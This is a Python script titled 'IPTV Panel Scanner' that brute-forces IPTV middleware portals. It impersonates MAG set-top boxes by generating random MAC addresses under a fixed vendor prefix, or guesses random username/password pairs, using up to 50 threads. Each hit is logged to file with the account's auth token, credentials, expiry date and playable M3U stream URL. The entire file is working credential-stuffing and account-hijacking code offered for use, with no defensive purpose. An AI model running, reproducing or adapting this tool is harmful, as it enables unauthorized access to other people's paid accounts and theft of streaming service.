# IPTV Panel Scanner
# Author: ssskingsss12
# Version: 0.0.6
# Description: Scan IPTV panels using MAC addresses or generated credentials.

import requests
import random
import time
import threading
import os
import re
import sys
import hashlib
import json
from datetime import datetime
from urllib.parse import quote, unquote

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class IPTVScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.mac_prefixes = [
            '00:1A:79:'
        ]
        self.active_threads = 0
        self.found_hits = 0
        self.scanned_count = 0
        self.running = True
        self.hits_file = "hits.txt"

    def validate_mac(self, mac):
        mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
        return bool(mac_pattern.match(mac))

    def normalize_mac(self, mac, case='upper'):
        mac = re.sub(r'[^0-9A-Fa-f]', '', mac)
        if len(mac) != 12:
            return None
        formatted = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return formatted.upper() if case == 'upper' else formatted.lower()

    def generate_mac(self, prefix_index=0, case='upper'):
        prefix = self.mac_prefixes[prefix_index]
        mac = prefix + ''.join([f"{random.randint(0, 255):02X}:" for _ in range(3)])[:-1]
        return mac.upper() if case == 'upper' else mac.lower()

    def generate_random_string(self, length=32, chars=None):
        if chars is None:
            chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return ''.join(random.choice(chars) for _ in range(length))

    def calculate_serial_number(self, mac):
        sn_hash = hashlib.md5(mac.encode()).hexdigest()
        return sn_hash.upper()[:13]

    def calculate_device_id(self, mac):
        return hashlib.sha256(mac.encode()).hexdigest().upper()

    def test_panel(self, panel_url, mac, timeout=10):
        try:
            if not panel_url.startswith('http'):
                panel_url = 'http://' + panel_url

            server = panel_url.replace('http://', '').replace('https://', '').split('/')[0]

            tkk = self.generate_random_string(32)

            endpoints = [
                f"http://{server}/server/load.php",
                f"http://{server}/portal.php",
                f"http://{server}/c/portal.php"
            ]

            headers = {
                'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3',
                'X-User-Agent': 'Model: MAG250; Link: WiFi',
                'Referer': f'http://{server}/c/',
                'Accept': '*/*',
                'Cookie': f'timezone=GMT; stb_lang=en; mac={quote(mac)}',
                'Host': server,
                'Connection': 'Keep-Alive',
                'Accept-Encoding': 'gzip, deflate'
            }

            auth_token = None
            working_endpoint = None

            for endpoint in endpoints:
                try:
                    handshake_url = f"{endpoint}?type=stb&action=handshake&token={tkk}&JsHttpRequest=1-xml"
                    response = self.session.get(handshake_url, headers=headers, timeout=timeout)

                    if response.status_code == 200 and '"token":"' in response.text:
                        token_match = re.search(r'"token":"([^"]+)"', response.text)
                        if token_match:
                            auth_token = token_match.group(1)
                            working_endpoint = endpoint
                            break
                except:
                    continue

            if not auth_token:
                return {'success': False, 'error': 'No token received'}

            headers['Authorization'] = f'Bearer {auth_token}'

            profile_url = f"{working_endpoint}?type=stb&action=get_profile&JsHttpRequest=1-xml"
            profile_response = self.session.get(profile_url, headers=headers, timeout=timeout)

            if profile_response.status_code != 200:
                return {'success': False, 'error': 'Profile request failed'}

            account_url = f"{working_endpoint}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
            account_response = self.session.get(account_url, headers=headers, timeout=timeout)

            if account_response.status_code != 200:
                return {'success': False, 'error': 'Account info request failed'}

            account_text = account_response.text

            if not any(x in account_text for x in ['"phone":"', '"end_date":"', '"account_state":"']):
                return {'success': False, 'error': 'No valid account indicators found'}

            exp_match = re.search(r'"phone":"([^"]+)"', account_text)
            exp_date = exp_match.group(1) if exp_match else "Unknown"

            if not exp_match:
                exp_match = re.search(r'"end_date":"([^"]+)"', account_text)
                exp_date = exp_match.group(1) if exp_match else "Unknown"

            channels_url = f"{working_endpoint}?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
            channels_response = self.session.get(channels_url, headers=headers, timeout=timeout)

            channel_count = 0
            if channels_response.status_code == 200:
                channel_match = re.findall(r'"ch_id":"', channels_response.text)
                channel_count = len(channel_match) if channel_match else 0

            link_url = f"{working_endpoint}?type=itv&action=create_link&forced_storage=undefined&download=0&cmd=ffmpeg%20http%3A%2F%2Flocalhost%2Fch%2F181212_&JsHttpRequest=1-xml"
            link_response = self.session.get(link_url, headers=headers, timeout=timeout)

            real_url = ""
            username = mac
            password = mac

            if link_response.status_code == 200 and '"cmd":"' in link_response.text:
                cmd_match = re.search(r'"cmd":"ffmpeg http://([^"]+)"', link_response.text)
                if cmd_match:
                    real_url = cmd_match.group(1)
                    parts = real_url.split('/')
                    if len(parts) >= 6:
                        username = parts[3]
                        password = parts[4]

            m3u_url = f"http://{server}/get.php?username={username}&password={password}&type=m3u_plus"
            try:
                m3u_response = self.session.get(m3u_url, headers=headers, timeout=5)
                m3u_status = "Working" if m3u_response.status_code == 200 else "Not Working"
            except:
                m3u_status = "Error"

            genres_url = f"{working_endpoint}?action=get_genres&type=itv&JsHttpRequest=1-xml"
            genres_response = self.session.get(genres_url, headers=headers, timeout=timeout)

            live_tv = "N/A"
            if genres_response.status_code == 200:
                titles = re.findall(r'"title":"([^"]+)"', genres_response.text)
                if titles:
                    live_tv = ", ".join(titles).replace(",", " ⮘🎬⮚")

            return {
                'success': True,
                'mac': mac,
                'panel': server,
                'endpoint': working_endpoint,
                'exp_date': exp_date,
                'channels': channel_count,
                'token': auth_token,
                'm3u_status': m3u_status,
                'm3u_url': m3u_url,
                'live_tv': live_tv,
                'username': username,
                'password': password,
                'real_url': f"http://{real_url}" if real_url else "N/A"
            }

        except Exception as e:
            return {'success': False, 'error': str(e)}

    def test_m3u_credentials(self, panel_url, username, password, timeout=8):
        try:
            if not panel_url.startswith('http'):
                panel_url = 'http://' + panel_url

            server = panel_url.replace('http://', '').replace('https://', '').split('/')[0]

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                'Accept': '*/*',
                'Connection': 'close',
                'Host': server
            }

            m3u_url = f"http://{server}/get.php?username={username}&password={password}&type=m3u_plus"

            try:
                resp = self.session.get(m3u_url, headers=headers, timeout=timeout)
            except Exception as e:
                return {'success': False, 'error': f"Request error: {e}", 'm3u_url': m3u_url}

            body = resp.text if resp is not None else ''
            ok = False
            if resp.status_code == 200:
                if '#EXTM3U' in body or len(body) > 50:
                    ok = True

            return {
                'success': ok,
                'status_code': resp.status_code,
                'm3u_url': m3u_url,
                'username': username,
                'password': password,
                'body_snippet': body[:200] if body else ''
            }

        except Exception as e:
            return {'success': False, 'error': str(e), 'm3u_url': m3u_url}

    def test_single_mac(self, panel_url, mac, case='upper'):
        normalized_mac = self.normalize_mac(mac, case)
        if not normalized_mac:
            print(f"\n\033[91m[!] Invalid MAC address format: {mac}\033[0m")
            return False

        print(f"\nTesting MAC: {normalized_mac} on {panel_url}")
        print("Please wait...")

        result = self.test_panel(panel_url, normalized_mac, timeout=15)

        if result['success']:
            print(f"\n\033[92m[+] MAC WORKING: {normalized_mac}\033[0m")
            print(f"   Panel: {result['panel']}")
            print(f"   Endpoint: {result['endpoint']}")
            print(f"   Expiration: {result['exp_date']}")
            print(f"   Channels: {result['channels']}")
            print(f"   M3U Status: {result['m3u_status']}")
            print(f"   Username: {result['username']}")
            print(f"   Password: {result['password']}")
            if result['m3u_status'] == "Working":
                print(f"   M3U URL: {result['m3u_url']}")
            if result['real_url'] != "N/A":
                print(f"   Real URL: {result['real_url']}")

            self.save_hit(result, mode='mac')
            return True
        else:
            print(f"\n\033[91m[!] MAC NOT WORKING: {normalized_mac}\033[0m")
            if 'error' in result:
                print(f"   Error: {result['error']}")
            return False

    def save_hit(self, result, mode='mac'):
        try:
            cwd = os.getcwd()
            hits_dir = os.path.join(cwd, "hits")
            os.makedirs(hits_dir, exist_ok=True)

            panel_name = result.get('panel', 'panel_hits')
            sanitized = re.sub(r'[^A-Za-z0-9._-]', '_', panel_name).strip('_')
            hits_file_path = os.path.join(hits_dir, f"{sanitized}.txt")

            with open(hits_file_path, 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"Hit Found: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Mode: {mode}\n")
                if mode == 'mac':
                    f.write(f"MAC: {result.get('mac')}\n")
                f.write(f"Panel: {result.get('panel')}\n")
                if 'endpoint' in result:
                    f.write(f"Endpoint: {result.get('endpoint')}\n")
                if 'exp_date' in result:
                    f.write(f"Expiration: {result.get('exp_date')}\n")
                if 'channels' in result:
                    f.write(f"Channels: {result.get('channels')}\n")
                if 'm3u_status' in result:
                    f.write(f"M3U Status: {result.get('m3u_status')}\n")
                if 'm3u_url' in result:
                    f.write(f"M3U URL: {result.get('m3u_url')}\n")
                if mode == 'creds':
                    f.write(f"Username: {result.get('username')}\n")
                    f.write(f"Password: {result.get('password')}\n")
                    f.write(f"M3U URL: {result.get('m3u_url')}\n")
                    if 'status_code' in result:
                        f.write(f"Status Code: {result.get('status_code')}\n")
                if 'real_url' in result and result.get('real_url') != "N/A":
                    f.write(f"Real URL: {result.get('real_url')}\n")
                if 'live_tv' in result:
                    f.write(f"Live TV: {result.get('live_tv')}\n")
                if 'token' in result:
                    f.write(f"Token: {result.get('token')}\n")
                if 'body_snippet' in result:
                    f.write(f"Body Snippet: {result.get('body_snippet')}\n")
                f.write(f"{'='*60}\n\n")

            self.found_hits += 1
            return True
        except Exception as e:
            print(f"Error saving hit: {e}")
            return False

    def worker(self, panel_url, mode='mac', mac_case='upper', prefix_index=0, creds_min=5, creds_max=15, timeout=10):
        self.active_threads += 1
        try:
            while self.running:
                if mode == 'mac':
                    mac = self.generate_mac(prefix_index, mac_case)
                    result = self.test_panel(panel_url, mac, timeout)
                    self.scanned_count += 1

                    if result['success']:
                        print(f"\n\033[92m[+] HIT FOUND (MAC): {mac} on {panel_url}\033[0m")
                        self.save_hit(result, mode='mac')

                else:
                    ulen = random.randint(creds_min, creds_max)
                    plen = random.randint(creds_min, creds_max)
                    username = self.generate_random_string(ulen)
                    password = self.generate_random_string(plen)
                    result = self.test_m3u_credentials(panel_url, username, password, timeout=8)
                    self.scanned_count += 1

                    if result.get('success'):
                        print(f"\n\033[92m[+] HIT FOUND (CREDS): {username}:{password} on {panel_url}\033[0m")
                        self.save_hit(result, mode='creds')

                if self.scanned_count % 10 == 0:
                    sys.stdout.write(f"\r\033[KScanned: {self.scanned_count} | Hits: {self.found_hits} | Active: {self.active_threads}")
                    sys.stdout.flush()

                time.sleep(0.1)

        except Exception as e:
            print(f"\n\033[91m[!] Error in worker: {e}\033[0m")
        finally:
            self.active_threads -= 1

# ---------------- Main Function ----------------
def main():
    scanner = IPTVScanner()

    print("\033[95m" + "="*60)
    print("           IPTV PANEL SCANNER")
    print("="*60 + "\033[0m")

    panel_url = input("Enter panel URL (e.g., ip.sltv.xyz:8080/c/): ").strip()
    if not panel_url:
        print("\033[91m[!] Panel URL is required!\033[0m")
        return

    server = panel_url.replace('http://', '').replace('https://', '').split('/')[0]
    sanitized = re.sub(r'[^A-Za-z0-9._-]', '_', server).strip('_') or "panel_hits"
    hits_dir = "hits"
    os.makedirs(hits_dir, exist_ok=True)
    scanner.hits_file = os.path.join(hits_dir, f"{sanitized}.txt")

    mode = input("Mode (mac/creds) [mac]: ").strip().lower()
    if mode not in ['mac', 'creds']:
        mode = 'mac'

    if mode == 'mac':
        test_single = input("Do you want to test a single MAC? (y/n) [n]: ").strip().lower()
        if test_single == 'y':
            mac = input("Enter MAC address: ").strip()
            case = input("MAC case (upper/lower) [upper]: ").strip().lower()
            if case not in ['upper', 'lower']:
                case = 'upper'
            scanner.test_single_mac(panel_url, mac, case)
            cont = input("\nContinue with automatic scanning? (y/n) [n]: ").strip().lower()
            if cont != 'y':
                return

    try:
        threads = int(input("Number of threads (1-50) [10]: ") or "10")
        threads = max(1, min(50, threads))
    except:
        threads = 10

    prefix_index = 0
    mac_case = 'upper'
    if mode == 'mac':
        mac_case = input("MAC case for auto-generation (upper/lower) [upper]: ").strip().lower()
        if mac_case not in ['upper', 'lower']:
            mac_case = 'upper'

        print("\nAvailable MAC prefixes:")
        for i, p in enumerate(scanner.mac_prefixes):
            print(f"{i+1}. {p}*")
        try:
            choice = int(input(f"Select prefix (1-{len(scanner.mac_prefixes)}) [1]: ") or "1") - 1
            prefix_index = max(0, min(len(scanner.mac_prefixes)-1, choice))
        except:
            prefix_index = 0

    creds_min, creds_max = 5, 15
    if mode == 'creds':
        try:
            creds_min = int(input("Minimum credential length [5]: ") or 5)
            creds_max = int(input("Maximum credential length [15]: ") or 15)
        except:
            creds_min, creds_max = 5, 15

    print(f"\nStarting scan on {panel_url} in mode: {mode} with {threads} threads...")
    print(f"Hits will be saved to: {scanner.hits_file}")
    print("Press Ctrl+C to stop\n")

    for _ in range(threads):
        t = threading.Thread(
            target=scanner.worker,
            args=(panel_url, mode, mac_case, prefix_index, creds_min, creds_max)
        )
        t.daemon = True
        t.start()

    try:
        while scanner.active_threads > 0:
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\nStopping scanner...")
        scanner.running = False

    print(f"\nScan finished. Total scanned: {scanner.scanned_count}, Hits found: {scanner.found_hits}")
    if scanner.found_hits > 0:
        print(f"Hits saved to: {scanner.hits_file}")


# ---------------- Run ----------------
if __name__ == "__main__":
    main()
